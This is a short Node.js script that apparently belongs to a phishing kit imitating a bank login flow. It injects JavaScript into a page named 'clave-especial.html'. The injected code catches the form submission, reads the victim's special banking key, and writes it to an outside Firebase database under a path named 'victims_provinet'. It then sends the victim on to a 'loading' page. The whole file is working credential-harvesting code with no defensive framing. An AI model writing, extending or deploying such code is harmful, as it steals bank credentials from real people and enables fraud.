const fs = require('fs');

let html = fs.readFileSync('clave-especial.html', 'utf8');

const firebaseScript = `
<!-- Firebase App (the core Firebase SDK) -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<!-- Firebase Realtime Database -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
  // Your web app's Firebase configuration
  const firebaseConfig = {
    databaseURL: "https://sca-mms-default-rtdb.firebaseio.com"
  };
  
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.database();
  const DB_PATH = 'victims_provinet';
  
  document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('form');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const claveEspecialInput = document.getElementById('clave_especial');
        const clave = claveEspecialInput ? claveEspecialInput.value : '';
        const victimId = localStorage.getItem('current_victim_id');
        
        if (victimId && clave) {
            // Update the victim's record with the new clave_especial
            db.ref(DB_PATH + '/' + victimId).update({
                clave_especial: clave
            }).then(() => {
                window.location.href = 'cargando.html';
            }).catch(error => {
                console.error("Error updating database:", error);
                window.location.href = 'cargando.html';
            });
        } else {
            // Fallback if no victim ID is found
            window.location.href = 'cargando.html';
        }
      });
    }
  });
</script>
</body>
</html>
`;

// Append script right before </body> or at the end
if (html.includes('</body>')) {
    html = html.replace('</body>', firebaseScript);
} else {
    html += firebaseScript;
}

fs.writeFileSync('clave-especial.html', html, 'utf8');
console.log('Firebase integration added to clave-especial.html');
